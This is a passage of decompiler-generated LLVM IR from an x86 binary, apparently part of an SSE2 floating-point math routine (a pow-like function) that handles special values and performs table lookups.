  %126 = call i128 @__asm_movlpd.38(i128 %124, i64 -134217728), !insn.addr !9822
  %127 = call i128 @__asm_andpd(i128 %105, i128 %101), !insn.addr !9823
  %128 = call i128 @__asm_andpd(i128 %126, i128 %111), !insn.addr !9824
  %129 = call i128 @__asm_subsd(i128 %109, i128 %125), !insn.addr !9825
  %130 = call i128 @__asm_xorpd(i128 %125, i128 %125), !insn.addr !9826
  %131 = call i128 @__asm_pinsrw(i128 %130, i32 16480, i32 3), !insn.addr !9827
  %132 = call i128 @__asm_movsd(i128 %90, i128 %127), !insn.addr !9828
  %133 = call i128 @__asm_mulsd(i128 %127, i128 %128), !insn.addr !9829
  %134 = call i128 @__asm_subsd(i128 %111, i128 %128), !insn.addr !9830
  %135 = call i128 @__asm_subsd(i128 %101, i128 %132), !insn.addr !9831
  %136 = call i128 @__asm_mulsd(i128 %133, i128 %131), !insn.addr !9832
  %137 = call i128 @__asm_mulsd(i128 %132, i128 %134), !insn.addr !9833
  %138 = load i128, i128* @global_var_10037fa0, align 4, !insn.addr !9834
  %139 = call i128 @__asm_movapd(i128 %138), !insn.addr !9834
  %140 = call i128 @__asm_mulsd(i128 %128, i128 %135), !insn.addr !9835
  %141 = call i32 @__asm_cvtsd2si(i128 %136), !insn.addr !9836
  %142 = call i128 @__asm_mulsd(i128 %134, i128 %135), !insn.addr !9837
  %143 = load i128, i128* @global_var_10037fb0, align 4, !insn.addr !9838
  %144 = call i128 @__asm_movapd(i128 %143), !insn.addr !9838
  %145 = call i128 @__asm_addsd(i128 %137, i128 %140), !insn.addr !9839
  %146 = call i128 @__asm_pshufd(i128 %142, i32 238), !insn.addr !9840
  %147 = call i128 @__asm_addsd(i128 %145, i128 %142), !insn.addr !9841
  %148 = sub i32 130943, %141, !insn.addr !9842
  %149 = add i32 %141, 123391, !insn.addr !9843
  %150 = or i32 %148, %149, !insn.addr !9844
  %151 = icmp slt i32 %150, 1, !insn.addr !9845
  br i1 %151, label %dec_label_pc_1002353e, label %dec_label_pc_10022f8f, !insn.addr !9845

dec_label_pc_10022f8f:                            ; preds = %dec_label_pc_10022f08
  %152 = add nsw i32 %ecx.0.reload, 130944, !insn.addr !9846
  %153 = add i32 %152, %141
  %154 = and i32 %153, -128, !insn.addr !9847
  %155 = call i128 @__asm_addsd(i128 %146, i128 %129), !insn.addr !9848
  %156 = call i128 @__asm_movsd(i128 %129, i128 %136), !insn.addr !9849
  %157 = call i128 @__asm_addsd.40(i128 %136, i64 4843621399236968448), !insn.addr !9850
  %158 = call i128 @__asm_mulpd(i128 %139, i128 %112), !insn.addr !9851
  %159 = call i128 @__asm_subsd.41(i128 %157, i64 4843621399236968448), !insn.addr !9852
  %160 = call i128 @__asm_mulpd(i128 %112, i128 %112), !insn.addr !9853
  %161 = call i128 @__asm_subsd(i128 %156, i128 %159), !insn.addr !9854
  %162 = mul i32 %141, 16, !insn.addr !9855
  %163 = and i32 %162, 2032, !insn.addr !9856
  %164 = add i32 %163, ptrtoint (i128** @global_var_10037fc0 to i32), !insn.addr !9857
  %165 = inttoptr i32 %164 to i128*, !insn.addr !9857
  %166 = load i128, i128* %165, align 4, !insn.addr !9857
  %167 = call i128 @__asm_movapd(i128 %166), !insn.addr !9857
  %168 = load i128, i128* @global_var_100331a0, align 4, !insn.addr !9858
  %169 = call i128 @__asm_movapd(i128 %168), !insn.addr !9858
  %170 = call i128 @__asm_mulpd(i128 %144, i128 %160), !insn.addr !9859
  %171 = call i128 @__asm_addpd(i128 %158, i128 %170), !insn.addr !9860
  %172 = call i128 @__asm_pshufd(i128 %171, i32 238), !insn.addr !9861
  %173 = call i128 @__asm_mulsd(i128 %171, i128 %160), !insn.addr !9862
  %174 = call i128 @__asm_xorpd(i128 %160, i128 %160), !insn.addr !9863
  %175 = call i128 @__asm_addsd(i128 %173, i128 %172), !insn.addr !9864
  %176 = call i128 @__asm_pinsrw(i128 %174, i32 16256, i32 3), !insn.addr !9865
  %177 = call i128 @__asm_addsd(i128 %175, i128 %155), !insn.addr !9866
  %178 = call i128 @__asm_movlpd.38(i128 %155, i64 4604418534313441775), !insn.addr !9867
  %179 = call i128 @__asm_movd(i32 %154), !insn.addr !9868
  %180 = call i128 @__asm_mulsd.39(i128 %177, i64 %arg2), !insn.addr !9869
  %181 = call i128 @__asm_mulsd(i128 %161, i128 %176), !insn.addr !9870
  %182 = call i128 @__asm_psllq.42(i128 %179, i32 45), !insn.addr !9871
  %183 = call i128 @__asm_pshufd(i128 %182, i32 68), !insn.addr !9872
  %184 = load i128, i128* @global_var_100331b0, align 4, !insn.addr !9873
  %185 = call i128 @__asm_movapd(i128 %184), !insn.addr !9873
  %186 = call i128 @__asm_addsd(i128 %147, i128 %180), !insn.addr !9874
  %187 = call i128 @__asm_mulpd(i128 %167, i128 %183), !insn.addr !9875
  %188 = call i128 @__asm_addsd(i128 %181, i128 %186), !insn.addr !9876
  %189 = call i128 @__asm_unpcklpd(i128 %188, i128 %188), !insn.addr !9877
  %190 = call i128 @__asm_mulpd(i128 %169, i128 %189), !insn.addr !9878
  %191 = call i128 @__asm_mulsd(i128 %178, i128 %189), !insn.addr !9879
  %192 = call i128 @__asm_mulpd(i128 %189, i128 %189), !insn.addr !9880
  %193 = call i128 @__asm_addpd(i128 %185, i128 %190), !insn.addr !9881
  %194 = call i128 @__asm_mulpd(i128 %193, i128 %192), !insn.addr !9882
  %195 = call i128 @__asm_mulsd(i128 %192, i128 %187), !insn.addr !9883
  %196 = call i128 @__asm_pshufd(i128 %194, i32 238), !insn.addr !9884
  %197 = call i128 @__asm_mulsd(i128 %195, i128 %194), !insn.addr !9885
  %198 = call i128 @__asm_pshufd(i128 %187, i32 238), !insn.addr !9886
  %199 = call i128 @__asm_mulsd(i128 %196, i128 %187), !insn.addr !9887
  %200 = call i128 @__asm_mulsd(i128 %191, i128 %187), !insn.addr !9888
  %201 = call i128 @__asm_addsd(i128 %197, i128 %198), !insn.addr !9889
  %202 = call i128 @__asm_addsd(i128 %201, i128 %199), !insn.addr !9890
  %203 = call i128 @__asm_addsd(i128 %202, i128 %200), !insn.addr !9891
  %204 = call i128 @__asm_addsd(i128 %203, i128 %187), !insn.addr !9892
  %205 = bitcast double %7 to i64, !insn.addr !9893
  call void @__asm_movlpd(i64 %205, i128 %204), !insn.addr !9893
  %206 = fpext double %7 to x86_fp80, !insn.addr !9894
  ret x86_fp80 %206, !insn.addr !9895

dec_label_pc_10023087:                            ; preds = %dec_label_pc_10022d39
  %207 = call i128 @__asm_movlpd.38(i128 %5, i64 %arg2), !insn.addr !9896
  %208 = load i64, i64* bitcast (i128* @global_var_10033190 to i64*), align 4, !insn.addr !9897
  %209 = call i128 @__asm_movlpd.38(i128 %3, i64 %208), !insn.addr !9897
  %210 = call i32 @__asm_movd.36(i128 %207), !insn.addr !9898
  %211 = call i128 @__asm_movsd(i128 %12, i128 %207), !insn.addr !9899
  %212 = call i128 @__asm_andpd(i128 %207, i128 %209), !insn.addr !9900
  %213 = call i128 @__asm_psrlq(i128 %212, i32 32), !insn.addr !9901
  %214 = call i32 @__asm_movd.36(i128 %213), !insn.addr !9902
  %215 = icmp ult i32 %214, 2146435072, !insn.addr !9903
  %216 = icmp eq i1 %215, false, !insn.addr !9904
  br i1 %216, label %dec_label_pc_10023190, label %dec_label_pc_100230b6, !insn.addr !9904

dec_label_pc_100230b6:                            ; preds = %dec_label_pc_10023087
  %217 = or i32 %214, %210, !insn.addr !9905
  %218 = icmp eq i32 %217, 0, !insn.addr !9906
  br i1 %218, label %dec_label_pc_100234b5, label %dec_label_pc_100230c1, !insn.addr !9907

dec_label_pc_100230c1:                            ; preds = %dec_label_pc_100230b6
  %219 = icmp slt i32 %34, 0, !insn.addr !9908
  %220 = icmp eq i1 %219, false, !insn.addr !9909
  store i128 %213, i128* %xmm1.0.reg2mem, !insn.addr !9909
  store i128 %211, i128* %xmm2.1.reg2mem, !insn.addr !9909
  store i128 %209, i128* %xmm3.1.reg2mem, !insn.addr !9909
  store i32 0, i32* %ecx.1.reg2mem, !insn.addr !9909
  br i1 %220, label %dec_label_pc_100231d4, label %dec_label_pc_100230ca, !insn.addr !9909

dec_label_pc_100230ca:                            ; preds = %dec_label_pc_100230c1
  %221 = call i128 @__asm_psllq.42(i128 %209, i32 52), !insn.addr !9910
  %222 = call i128 @__asm_orpd(i128 %211, i128 %221), !insn.addr !9911
  %223 = call i128 @__asm_movd(i32 1011), !insn.addr !9912
  %224 = call i128 @__asm_psrlq(i128 %213, i32 20), !insn.addr !9913
  %225 = call i128 @__asm_psubd(i128 %224, i128 %223), !insn.addr !9914
  %226 = call i128 @__asm_pxor(i128 %223, i128 %223), !insn.addr !9915
  %227 = call i128 @__asm_pmaxsw(i128 %225, i128 %226), !insn.addr !9916
  %228 = call i128 @__asm_psllq(i128 %222, i128 %227), !insn.addr !9917
  %229 = call i128 @__asm_pcmpeqd(i128 %228, i128 %226), !insn.addr !9918
  %230 = call i32 @__asm_pmovmskb(i128 %229), !insn.addr !9919
  %231 = and i32 %18, 32767, !insn.addr !9920
  %232 = icmp ult i32 %231, 32752, !insn.addr !9921
  %233 = icmp eq i1 %232, false, !insn.addr !9922
  br i1 %233, label %dec_label_pc_100232b8, label %dec_label_pc_10023115, !insn.addr !9922

dec_label_pc_10023115:                            ; preds = %dec_label_pc_100230ca
  %234 = and i32 %230, 255, !insn.addr !9923
  %235 = icmp eq i32 %234, 255, !insn.addr !9924
  %236 = icmp eq i1 %235, false, !insn.addr !9925
  br i1 %236, label %dec_label_pc_100233b1, label %dec_label_pc_10023125, !insn.addr !9925

dec_label_pc_10023125:                            ; preds = %dec_label_pc_10023115
  %237 = call i128 @__asm_movlpd.38(i128 %227, i64 %arg2), !insn.addr !9926
  %238 = call i128 @__asm_movlpd.38(i128 %229, i64 %arg2), !insn.addr !9927
  %239 = call i128 @__asm_movd(i32 1012), !insn.addr !9928
  %240 = load i128, i128* @global_var_10033190, align 4, !insn.addr !9929
  %241 = call i128 @__asm_andpd(i128 %237, i128 %240), !insn.addr !9929
  %242 = call i128 @__asm_psrlq(i128 %241, i32 52), !insn.addr !9930
  %243 = call i128 @__asm_psubd(i128 %242, i128 %239), !insn.addr !9931
  %244 = call i128 @__asm_movlpd.38(i128 %239, i64 -9223372036854775808), !insn.addr !9932
  %245 = call i128 @__asm_psllq(i128 %238, i128 %243), !insn.addr !9933
  %246 = call i128 @__asm_pcmpeqd(i128 %245, i128 %244), !insn.addr !9934
  %247 = call i32 @__asm_pmovmskb(i128 %246), !insn.addr !9935
  %248 = and i32 %247, 255, !insn.addr !9936
  %249 = add nuw nsw i32 %248, 261889, !insn.addr !9937
  %250 = and i32 %249, 262144, !insn.addr !9938
  %251 = icmp ult i32 %231, 16, !insn.addr !9939
  store i128 %243, i128* %xmm1.0.reg2mem, !insn.addr !9940
  store i128 %246, i128* %xmm2.1.reg2mem, !insn.addr !9940
  store i128 %244, i128* %xmm3.1.reg2mem, !insn.addr !9940
  store i32 %250, i32* %ecx.1.reg2mem, !insn.addr !9940
  br i1 %251, label %dec_label_pc_100231d4, label %dec_label_pc_10023176, !insn.addr !9940

dec_label_pc_10023176:                            ; preds = %dec_label_pc_10023125
  %252 = call i128 @__asm_movlpd.38(i128 %244, i64 %9), !insn.addr !9941
  %253 = call i128 @__asm_movlpd.38(i128 %246, i64 %11), !insn.addr !9942
  store i128 %15, i128* %xmm0.0.reg2mem, !insn.addr !9943
  store i128 %253, i128* %xmm2.0.reg2mem, !insn.addr !9943
  store i128 %252, i128* %xmm3.0.reg2mem, !insn.addr !9943
  store i128 %14, i128* %xmm4.0.reg2mem, !insn.addr !9943
  store i128 %28, i128* %xmm5.0.reg2mem, !insn.addr !9943
  store i128 %33, i128* %xmm6.0.reg2mem, !insn.addr !9943
  store i128 %26, i128* %xmm7.0.reg2mem, !insn.addr !9943
  store i32 %250, i32* %ecx.0.reg2mem, !insn.addr !9943
  store i32 786047, i32* %edx.0.reg2mem, !insn.addr !9943
  br label %dec_label_pc_10022db6, !insn.addr !9943

dec_label_pc_10023190:                            ; preds = %dec_label_pc_10023087
  %254 = call i128 @__asm_movlpd.38(i128 %26, i64 %arg1), !insn.addr !9944
  %255 = call i128 @__asm_movlpd.38(i128 %14, i64 %arg1), !insn.addr !9945
  %256 = call i32 @__asm_movd.36(i128 %254), !insn.addr !9946
  %257 = call i128 @__asm_psrlq(i128 %254, i32 32), !insn.addr !9947
  %258 = call i32 @__asm_movd.36(i128 %257), !insn.addr !9948
  %259 = and i32 %258, 2147483647, !insn.addr !9949
  %260 = icmp ult i32 %259, 2146435072, !insn.addr !9950
  store i64 %9, i64* %.reg2mem, !insn.addr !9951
  store i128 %15, i128* %xmm0.3.reg2mem, !insn.addr !9951
  store i128 %213, i128* %xmm1.3.reg2mem, !insn.addr !9951
  store i128 %211, i128* %xmm2.4.reg2mem, !insn.addr !9951
  store i128 %209, i128* %xmm3.4.reg2mem, !insn.addr !9951
  store i128 %255, i128* %xmm4.5.reg2mem, !insn.addr !9951
  store i32 %258, i32* %ecx.4.reg2mem, !insn.addr !9951
  store i32 %256, i32* %edx.1.reg2mem, !insn.addr !9951
  br i1 %260, label %dec_label_pc_1002342d, label %dec_label_pc_100231bb, !insn.addr !9951

dec_label_pc_100231bb:                            ; preds = %dec_label_pc_10023190
  %261 = icmp eq i32 %259, 2146435072
  %262 = icmp eq i32 %256, 0, !insn.addr !9952
  %or.cond = icmp eq i1 %262, %261
  store i128 %255, i128* %xmm4.4.reg2mem, !insn.addr !9953
  store i64 %9, i64* %.reg2mem, !insn.addr !9953
  store i128 %15, i128* %xmm0.3.reg2mem, !insn.addr !9953
  store i128 %213, i128* %xmm1.3.reg2mem, !insn.addr !9953
  store i128 %211, i128* %xmm2.4.reg2mem, !insn.addr !9953
  store i128 %209, i128* %xmm3.4.reg2mem, !insn.addr !9953
  store i128 %255, i128* %xmm4.5.reg2mem, !insn.addr !9953
  store i32 %258, i32* %ecx.4.reg2mem, !insn.addr !9953
  store i32 0, i32* %edx.1.reg2mem, !insn.addr !9953
  br i1 %or.cond, label %dec_label_pc_1002342d, label %dec_label_pc_1002339f, !insn.addr !9953

dec_label_pc_100231d4:                            ; preds = %dec_label_pc_100230c1, %dec_label_pc_10023125
  %ecx.1.reload = load i32, i32* %ecx.1.reg2mem
  %xmm3.1.reload = load i128, i128* %xmm3.1.reg2mem
  %xmm2.1.reload = load i128, i128* %xmm2.1.reg2mem
  %263 = call i128 @__asm_xorpd(i128 %15, i128 %15), !insn.addr !9954
  %264 = call i128 @__asm_pinsrw(i128 %263, i32 17392, i32 3), !insn.addr !9955
  %265 = call i128 @__asm_movlpd.38(i128 %26, i64 %9), !insn.addr !9956
  %266 = call i128 @__asm_movlpd.38(i128 %xmm2.1.reload, i64 %11), !insn.addr !9957
  %267 = call i128 @__asm_mulsd(i128 %264, i128 %14), !insn.addr !9958
  %268 = call i32 @__asm_movd.36(i128 %14), !insn.addr !9959
  %269 = call i128 @__asm_psrlq(i128 %14, i32 32), !insn.addr !9960
  %270 = call i32 @__asm_movd.36(i128 %269), !insn.addr !9961
  %271 = icmp eq i32 %268, 0, !insn.addr !9962
  br i1 %271, label %dec_label_pc_1002325a, label %dec_label_pc_10023208, !insn.addr !9963

dec_label_pc_10023208:                            ; preds = %dec_label_pc_1002325a, %dec_label_pc_100231d4
  %272 = call i128 @__asm_andpd(i128 %265, i128 %267), !insn.addr !9964
  %273 = call i128 @__asm_movsd(i128 %269, i128 %267), !insn.addr !9965
  %274 = load i128, i128* @global_var_10033190, align 4, !insn.addr !9966
  %275 = call i128 @__asm_andpd(i128 %267, i128 %274), !insn.addr !9966
  %276 = call i128 @__asm_psrlq(i128 %275, i32 44), !insn.addr !9967
  %277 = call i32 @__asm_pextrw(i128 %276, i32 0), !insn.addr !9968
  %278 = call i128 @__asm_orpd(i128 %272, i128 %266), !insn.addr !9969
  %279 = and i32 %277, 255, !insn.addr !9970
  %280 = add nuw nsw i32 %279, 1, !insn.addr !9971
  %281 = and i32 %280, 510, !insn.addr !9972
  %282 = mul i32 %281, 4, !insn.addr !9973
  %283 = add i32 %282, ptrtoint (i64** @global_var_10034f38 to i32), !insn.addr !9973
  %284 = inttoptr i32 %283 to i64*, !insn.addr !9973
  %285 = load i64, i64* %284, align 4, !insn.addr !9973
  %286 = call i128 @__asm_mulsd.39(i128 %278, i64 %285), !insn.addr !9973
  %287 = load i64, i64* %284, align 4, !insn.addr !9974
  %288 = call i128 @__asm_movlpd.38(i128 %28, i64 %287), !insn.addr !9974
  %289 = mul i32 %281, 8, !insn.addr !9975
  %290 = add i32 %289, ptrtoint (i128** @global_var_10035350 to i32), !insn.addr !9975
  %291 = inttoptr i32 %290 to i128*, !insn.addr !9975
  %292 = load i128, i128* %291, align 4, !insn.addr !9975
  %293 = call i128 @__asm_movapd(i128 %292), !insn.addr !9975
  store i128 %276, i128* %xmm0.0.reg2mem, !insn.addr !9976
  store i128 %266, i128* %xmm2.0.reg2mem, !insn.addr !9976
  store i128 %xmm3.1.reload, i128* %xmm3.0.reg2mem, !insn.addr !9976
  store i128 %273, i128* %xmm4.0.reg2mem, !insn.addr !9976
  store i128 %288, i128* %xmm5.0.reg2mem, !insn.addr !9976
  store i128 %293, i128* %xmm6.0.reg2mem, !insn.addr !9976
  store i128 %286, i128* %xmm7.0.reg2mem, !insn.addr !9976
  store i32 %ecx.1.reload, i32* %ecx.0.reg2mem, !insn.addr !9976
  store i32 278143, i32* %edx.0.reg2mem, !insn.addr !9976
  br label %dec_label_pc_10022db6, !insn.addr !9976

dec_label_pc_1002325a:                            ; preds = %dec_label_pc_100231d4
  %xmm1.0.reload = load i128, i128* %xmm1.0.reg2mem
  %294 = and i32 %270, 2147483647, !insn.addr !9977
  %295 = icmp eq i32 %294, 0, !insn.addr !9978
  %296 = icmp eq i1 %295, false, !insn.addr !9979
  store i32 %ecx.1.reload, i32* %ecx.312.reg2mem, !insn.addr !9979
  store i32 %270, i32* %eax.011.reg2mem, !insn.addr !9979
  store i128 %266, i128* %xmm2.310.reg2mem, !insn.addr !9979
  store i128 %xmm1.0.reload, i128* %xmm1.19.reg2mem, !insn.addr !9979
  br i1 %296, label %dec_label_pc_10023208, label %dec_label_pc_10023267, !insn.addr !9979

dec_label_pc_10023267:                            ; preds = %dec_label_pc_100233b1, %dec_label_pc_1002325a
  %eax.011.reload = load i32, i32* %eax.011.reg2mem
  %ecx.312.reload = load i32, i32* %ecx.312.reg2mem
  %297 = icmp sgt i32 %arg3, -1, !insn.addr !9980
  %298 = mul i32 %ecx.312.reload, 8192
  %299 = and i32 %eax.011.reload, %298
  br i1 %297, label %dec_label_pc_100232a7, label %dec_label_pc_10023276, !insn.addr !9981

dec_label_pc_10023276:                            ; preds = %dec_label_pc_10023267
  %xmm1.19.reload = load i128, i128* %xmm1.19.reg2mem
  %xmm2.310.reload = load i128, i128* %xmm2.310.reg2mem
  %300 = or i32 %299, 2146435072, !insn.addr !9982
  %301 = call i128 @__asm_movd(i32 %300), !insn.addr !9983
  %302 = call i128 @__asm_psllq.42(i128 %301, i32 32), !insn.addr !9984
  %303 = call i128 @__asm_movlpd.38(i128 %xmm1.19.reload, i64 %11), !insn.addr !9985
  %304 = call i128 @__asm_movlpd.38(i128 %xmm2.310.reload, i64 %arg1), !insn.addr !9986
  %305 = call i128 @__asm_divsd(i128 %303, i128 %304), !insn.addr !9987
  store i128 %302, i128* %xmm0.4.reg2mem, !insn.addr !9988
  store i32 27, i32* %edx.2.reg2mem, !insn.addr !9988
  br label %dec_label_pc_1002350e, !insn.addr !9988

dec_label_pc_100232a7:                            ; preds = %dec_label_pc_10023267
  %306 = icmp eq i32 %299, 0, !insn.addr !9989
  %307 = icmp eq i1 %306, false, !insn.addr !9990
  store x86_fp80 0xK00000000000000000000, x86_fp80* %merge.reg2mem, !insn.addr !9990
  br i1 %307, label %dec_label_pc_10023359, label %dec_label_pc_100232b5, !insn.addr !9990

dec_label_pc_100232b5:                            ; preds = %dec_label_pc_1002340d, %dec_label_pc_10023451, %dec_label_pc_1002348b, %dec_label_pc_10023477, %dec_label_pc_10023383, %dec_label_pc_10023367, %dec_label_pc_10023344, %dec_label_pc_1002349f, %dec_label_pc_10023359, %dec_label_pc_100232a7
  %merge.reload = load x86_fp80, x86_fp80* %merge.reg2mem
  ret x86_fp80 %merge.reload, !insn.addr !9991

dec_label_pc_100232b8:                            ; preds = %dec_label_pc_100230ca
  %308 = call i128 @__asm_movlpd.38(i128 %226, i64 %9), !insn.addr !9992
  %309 = call i128 @__asm_xorpd(i128 %227, i128 %227), !insn.addr !9993
  %310 = call i128 @__asm_andpd(i128 %308, i128 %14), !insn.addr !9994
  %311 = call i128 @__asm_pcmpeqd(i128 %309, i128 %310), !insn.addr !9995
  %312 = call i32 @__asm_pmovmskb(i128 %311), !insn.addr !9996
  %313 = and i32 %312, 255, !insn.addr !9997
  %314 = icmp eq i32 %313, 255, !insn.addr !9998
  %315 = icmp eq i1 %314, false, !insn.addr !9999
  store i128 %14, i128* %xmm4.4.reg2mem, !insn.addr !9999
  br i1 %315, label %dec_label_pc_1002339f, label %dec_label_pc_100232e2, !insn.addr !9999

dec_label_pc_100232e2:                            ; preds = %dec_label_pc_100232b8
  %316 = call i32 @__asm_pextrw(i128 %14, i32 3), !insn.addr !10000
  %317 = trunc i32 %316 to i16
  %318 = icmp sgt i16 %317, -1, !insn.addr !10001
  br i1 %318, label %dec_label_pc_10023383, label %dec_label_pc_100232f6, !insn.addr !10002

dec_label_pc_100232f6:                            ; preds = %dec_label_pc_100232e2
  %319 = and i32 %230, 255, !insn.addr !10003
  %320 = icmp eq i32 %319, 255, !insn.addr !10004
  %321 = icmp eq i1 %320, false, !insn.addr !10005
  store i128 %311, i128* %xmm1.2.reg2mem, !insn.addr !10005
  br i1 %321, label %dec_label_pc_10023367, label %dec_label_pc_10023302, !insn.addr !10005

dec_label_pc_10023302:                            ; preds = %dec_label_pc_100232f6
  %322 = call i128 @__asm_movlpd.38(i128 %311, i64 %arg2), !insn.addr !10006
  %323 = call i128 @__asm_movlpd.38(i128 %229, i64 %arg2), !insn.addr !10007
  %324 = call i128 @__asm_movd(i32 1012), !insn.addr !10008
  %325 = load i128, i128* @global_var_10033190, align 4, !insn.addr !10009
  %326 = call i128 @__asm_andpd(i128 %322, i128 %325), !insn.addr !10009
  %327 = call i128 @__asm_psrlq(i128 %326, i32 52), !insn.addr !10010
  %328 = call i128 @__asm_psubd(i128 %327, i128 %324), !insn.addr !10011
  %329 = call i128 @__asm_pxor(i128 %324, i128 %324), !insn.addr !10012
  %330 = call i128 @__asm_psllq(i128 %323, i128 %328), !insn.addr !10013
  %331 = call i128 @__asm_pcmpeqd(i128 %330, i128 %329), !insn.addr !10014
  %332 = call i32 @__asm_pmovmskb(i128 %331), !insn.addr !10015
  %333 = and i32 %332, 255, !insn.addr !10016
  %334 = icmp eq i32 %333, 255, !insn.addr !10017
  store i128 %328, i128* %xmm1.2.reg2mem, !insn.addr !10018
  br i1 %334, label %dec_label_pc_10023367, label %dec_label_pc_10023344, !insn.addr !10018

dec_label_pc_10023344:                            ; preds = %dec_label_pc_10023302
  %335 = call i128 @__asm_movlpd.38(i128 %328, i64 %arg2), !insn.addr !10019
  %336 = call i32 @__asm_pextrw(i128 %335, i32 3), !insn.addr !10020
  %337 = trunc i32 %336 to i16
  %338 = icmp sgt i16 %337, -1, !insn.addr !10021
  store x86_fp80 0xKFFFF8000000000000000, x86_fp80* %merge.reg2mem, !insn.addr !10022
  br i1 %338, label %dec_label_pc_100232b5, label %dec_label_pc_10023359, !insn.addr !10022

dec_label_pc_10023359:                            ; preds = %dec_label_pc_10023344, %dec_label_pc_100232a7
  store x86_fp80 0xK80000000000000000000, x86_fp80* %merge.reg2mem
  br label %dec_label_pc_100232b5

dec_label_pc_10023367:                            ; preds = %dec_label_pc_10023302, %dec_label_pc_100232f6
  %xmm1.2.reload = load i128, i128* %xmm1.2.reg2mem
  %339 = call i128 @__asm_movlpd.38(i128 %xmm1.2.reload, i64 %arg2), !insn.addr !10023
  %340 = call i32 @__asm_pextrw(i128 %339, i32 3), !insn.addr !10024
  %341 = trunc i32 %340 to i16
  %342 = icmp sgt i16 %341, -1, !insn.addr !10025
  store x86_fp80 0xK00000000000000000000, x86_fp80* %merge.reg2mem, !insn.addr !10026
  br i1 %342, label %dec_label_pc_1002349f, label %dec_label_pc_100232b5, !insn.addr !10026

dec_label_pc_10023383:                            ; preds = %dec_label_pc_100232e2
  %343 = call i128 @__asm_movlpd.38(i128 %311, i64 %arg2), !insn.addr !10027
  %344 = call i32 @__asm_pextrw(i128 %343, i32 3), !insn.addr !10028
  %345 = trunc i32 %344 to i16
  %346 = icmp sgt i16 %345, -1, !insn.addr !10029
  store x86_fp80 0xK00000000000000000000, x86_fp80* %merge.reg2mem, !insn.addr !10030
  br i1 %346, label %dec_label_pc_1002349f, label %dec_label_pc_100232b5, !insn.addr !10030

dec_label_pc_1002339f:                            ; preds = %dec_label_pc_100231bb, %dec_label_pc_100232b8
  %xmm4.4.reload = load i128, i128* %xmm4.4.reg2mem
  %347 = call i128 @__asm_addsd(i128 %xmm4.4.reload, i128 %xmm4.4.reload), !insn.addr !10031
  %348 = call i128 @__asm_movsd(i128 %15, i128 %347), !insn.addr !10032
  store i128 %348, i128* %xmm0.4.reg2mem, !insn.addr !10033
  store i32 1006, i32* %edx.2.reg2mem, !insn.addr !10033
  br label %dec_label_pc_1002350e, !insn.addr !10033

dec_label_pc_100233b1:                            ; preds = %dec_label_pc_10023115
  %349 = call i128 @__asm_movlpd.38(i128 %229, i64 %arg1), !insn.addr !10034
  %350 = call i32 @__asm_movd.36(i128 %349), !insn.addr !10035
  %351 = call i128 @__asm_psrlq(i128 %349, i32 32), !insn.addr !10036
  %352 = call i32 @__asm_movd.36(i128 %351), !insn.addr !10037
  %353 = and i32 %352, 2147483647, !insn.addr !10038
  %354 = or i32 %353, %350, !insn.addr !10039
  %355 = icmp eq i32 %354, 0, !insn.addr !10040
  store i32 0, i32* %ecx.312.reg2mem, !insn.addr !10041
  store i32 0, i32* %eax.011.reg2mem, !insn.addr !10041
  store i128 %351, i128* %xmm2.310.reg2mem, !insn.addr !10041
  store i128 %227, i128* %xmm1.19.reg2mem, !insn.addr !10041
  br i1 %355, label %dec_label_pc_10023267, label %dec_label_pc_100233da, !insn.addr !10041

dec_label_pc_100233da:                            ; preds = %dec_label_pc_100233b1
  %356 = call i128 @__asm_movlpd.38(i128 %227, i64 9218868437227405313), !insn.addr !10042
  %357 = call i128 @__asm_movlpd.38(i128 %15, i64 -2251799813685248), !insn.addr !10043
  %358 = call i128 @__asm_mulsd(i128 %356, i128 %356), !insn.addr !10044
  store i128 %357, i128* %xmm0.4.reg2mem, !insn.addr !10045
  store i32 28, i32* %edx.2.reg2mem, !insn.addr !10045
  br label %dec_label_pc_1002350e, !insn.addr !10045

dec_label_pc_100233f8:                            ; preds = %dec_label_pc_10022db6
  %359 = trunc i128 %47 to i64
  %360 = call i128 @__asm_movlpd.38(i128 %108, i64 %arg1), !insn.addr !10046
  %361 = call i128 @__asm_movlpd.38(i128 %107, i64 %arg2), !insn.addr !10047
  %362 = call i32 @__asm_movd.36(i128 %360), !insn.addr !10048
  %363 = icmp eq i32 %362, 0, !insn.addr !10049
  %364 = icmp eq i1 %363, false, !insn.addr !10050
  store i64 %359, i64* %.reg2mem, !insn.addr !10050
  store i128 %109, i128* %xmm0.3.reg2mem, !insn.addr !10050
  store i128 %101, i128* %xmm1.3.reg2mem, !insn.addr !10050
  store i128 %361, i128* %xmm2.4.reg2mem, !insn.addr !10050
  store i128 %105, i128* %xmm3.4.reg2mem, !insn.addr !10050
  store i128 %360, i128* %xmm4.5.reg2mem, !insn.addr !10050
  store i32 %ecx.0.reload, i32* %ecx.4.reg2mem, !insn.addr !10050
  store i32 %106, i32* %edx.1.reg2mem, !insn.addr !10050
  br i1 %364, label %dec_label_pc_1002342d, label %dec_label_pc_1002340d, !insn.addr !10050

dec_label_pc_1002340d:                            ; preds = %dec_label_pc_100233f8
  %365 = call i128 @__asm_psrlq(i128 %360, i32 32), !insn.addr !10051
  %366 = call i32 @__asm_movd.36(i128 %365), !insn.addr !10052
  %367 = icmp ne i32 %366, 1072693248, !insn.addr !10053
  %368 = icmp eq i32 %366, -1074790400, !insn.addr !10054
  %369 = icmp eq i1 %368, false, !insn.addr !10055
  %or.cond7 = icmp eq i1 %367, %369
  store x86_fp80 0xK3FFF8000000000000000, x86_fp80* %merge.reg2mem, !insn.addr !10056
  store i64 %359, i64* %.reg2mem, !insn.addr !10056
  store i128 %109, i128* %xmm0.3.reg2mem, !insn.addr !10056
  store i128 %101, i128* %xmm1.3.reg2mem, !insn.addr !10056
  store i128 %361, i128* %xmm2.4.reg2mem, !insn.addr !10056
  store i128 %105, i128* %xmm3.4.reg2mem, !insn.addr !10056
  store i128 %365, i128* %xmm4.5.reg2mem, !insn.addr !10056
  store i32 %ecx.0.reload, i32* %ecx.4.reg2mem, !insn.addr !10056
  store i32 %366, i32* %edx.1.reg2mem, !insn.addr !10056
  br i1 %or.cond7, label %dec_label_pc_1002342d, label %dec_label_pc_100232b5, !insn.addr !10056

dec_label_pc_1002342d:                            ; preds = %dec_label_pc_1002340d, %dec_label_pc_100231bb, %dec_label_pc_100233f8, %dec_label_pc_10023190
  %xmm3.4.reload = load i128, i128* %xmm3.4.reg2mem
  %xmm2.4.reload = load i128, i128* %xmm2.4.reg2mem
  %xmm1.3.reload = load i128, i128* %xmm1.3.reg2mem
  %.reload = load i64, i64* %.reg2mem, !insn.addr !10057
